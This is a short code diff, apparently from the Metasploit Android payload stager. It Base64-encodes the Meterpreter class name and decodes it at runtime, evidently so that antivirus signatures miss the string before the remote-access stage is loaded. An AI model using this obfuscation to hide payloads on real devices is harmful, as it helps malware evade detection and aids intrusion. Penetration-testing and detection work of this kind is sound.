@@ -1,6 +1,7 @@
 package com.metasploit.stage;
 
 import android.content.Context;
+import android.util.Base64;
 
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
@@ -155,8 +156,9 @@ public class Payload {
 
     private static void runNextStage(DataInputStream in, OutputStream out, Object[] parameters) throws Exception {
         try {
+            byte[] androidMeterpreter = Base64.decode("Y29tLm1ldGFzcGxvaXQubWV0ZXJwcmV0ZXIuQW5kcm9pZE1ldGVycHJldGVy", 0);
             Class<?> existingClass = Payload.class.getClassLoader().
-                    loadClass("com.metasploit.meterpreter.AndroidMeterpreter");
+                    loadClass(new String(androidMeterpreter, "UTF-8"));
             existingClass.getConstructor(new Class[]{
                     DataInputStream.class, OutputStream.class, Object[].class, boolean.class
             }).newInstance(in, out, parameters, false);
